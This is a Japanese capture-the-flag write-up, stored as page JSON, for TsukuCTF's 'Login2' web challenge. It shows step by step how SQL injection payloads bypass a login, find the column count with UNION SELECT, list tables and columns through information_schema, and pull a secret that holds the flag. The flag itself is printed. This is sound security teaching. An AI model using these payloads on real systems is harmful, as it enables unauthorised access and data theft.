{"pageProps":{"postData":{"id":"Login2","contentHtml":"# Login 2\n\n> 筑紫君が自分の会員制サイトを修正したんだって。でもどうやら何が問題だったのかわかっていないみたいですよ?\n>\n> https://tsukuctf.sechack365.com/problems/login2\n>\n> ※ この問題では/problems/login2 以下のみを用います。 他の問題/problems/<name>などと混同しないよう注意してください。\n\nLogin 1 ~ 3 がセットで SQL injection の問題になっています。\nLogin2 では、SQL injection が可能な場所を見つけた後に、適切な Injection によりデーターベース内の情報を探索することで flag を得ることができます。\n\nまず Username に`' or 1=1 ; --`を指定すると、図のようなログイン画面が表示されます。\n\n![login2](./login2.png)\n\nどうやらここに SQLi ができそうです。\n`UNION SELECT` で情報を抜くために、まず SELECT 文のカラム数を特定します。\nUsername として `' union select null ; -- `, `' union select null, null ; -- `, `' union select null, null, null ; -- ` ...と null の数を増やしていくと、null が 2 個のときにログインに成功します。\nこれにて攻撃の準備は完了です。ここからは、データベース内を探索していきます。\n\nMySQL 内のデータに関する情報は、`information_schema.columns`というテーブルに収納されています。まずは、ここの`table_name`というカラムを見るのが定石です。ということで、Username に\n\n```txt\n' UNION SELECT table_name, null FROM information_schema.columns; --\n```\n\nを入力してログインすると、`super_secret_table`というテーブルがあることがわかります。多分 flag はここでしょう。\n次に、カラム名を知るために、Username を\n\n```txt\n' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'super_secret_table'; --\n```\n\nとしてログインします。すると、id と secret というカラムがあることがわかります。\n最後に、\n\n```txt\n' UNION SELECT secret, null FROM super_secret_table; --\n```\n\nとすれば flag がゲットできます。\n\n```txt\nTsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}\n```\n","title":"Login2","description":"union select  によるSQLi","author":"rikuta0811_dash","genre":"Web","solver":21,"point":323}},"__N_SSG":true}